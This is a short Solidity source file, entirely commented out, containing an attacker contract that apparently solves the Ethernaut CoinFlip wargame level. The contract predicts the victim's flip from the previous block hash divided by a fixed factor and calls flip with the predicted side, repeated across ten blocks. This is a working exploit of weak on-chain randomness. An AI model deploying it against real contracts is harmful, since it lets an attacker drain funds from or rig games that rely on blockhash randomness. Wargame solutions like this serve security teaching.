// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/*
import '@openzeppelin/contracts/math/SafeMath.sol';

interface ICoinFlip {

  function flip(bool _guess) external returns (bool);
}


contract AttackerCoinFlip{

    using SafeMath for uint256;

    ICoinFlip victim;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victim) {
        victim = ICoinFlip(_victim);
    }

    function attack() public {
        //Needs to be triggered 10 times in 10 different blocks
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        require(victim.flip(side),"Didn't win");
    }
}*/